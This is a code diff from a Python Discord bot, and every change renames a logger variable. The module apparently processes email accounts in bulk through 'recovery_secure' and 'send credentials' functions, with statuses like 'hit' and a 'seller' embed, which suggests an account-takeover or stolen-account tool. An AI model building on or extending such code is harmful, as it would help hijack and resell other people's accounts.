@@ -7,7 +7,7 @@ import discord
 from authsecuring.embed_builder import build_failure_embed
 from views.modals.recovery_code import _send_early_credentials, _send_failure_dm
 
-log = logging.getLogger(__name__)
+rom = logging.getLogger(__name__)
 
 T = TypeVar("T")
 
@@ -26,7 +26,7 @@ async def _secure_one(
         except TypeError:
             account = await secure_fn()
     except Exception as e:
-        log.exception("recovery_secure crashed for %s during bulk", email)
+        rom.exception("recovery_secure crashed for %s during bulk", email)
         fail_embed = build_failure_embed(
             email,
             {},
@@ -89,7 +89,7 @@ async def _secure_one(
     except discord.Forbidden:
         return {"email": email, "status": "hit", "note": "DMs disabled"}
     except KeyError:
-        log.exception("Success result missing expected keys for %s", email)
+        rom.exception("Success result missing expected keys for %s", email)
         await _send_failure_dm(
             user, account.get("hit_embed") or account.get("seller_embed")
         )
@@ -124,7 +124,7 @@ async def run_bulk_parallel(
     for i, result in enumerate(results):
         email = jobs[i][0]
         if isinstance(result, Exception):
-            log.exception("Unhandled bulk task error for %s", email, exc_info=result)
+            rom.exception("Unhandled bulk task error for %s", email, exc_info=result)
             failures += 1
             failed_emails.append(f"`{email}` (exception)")
             continue
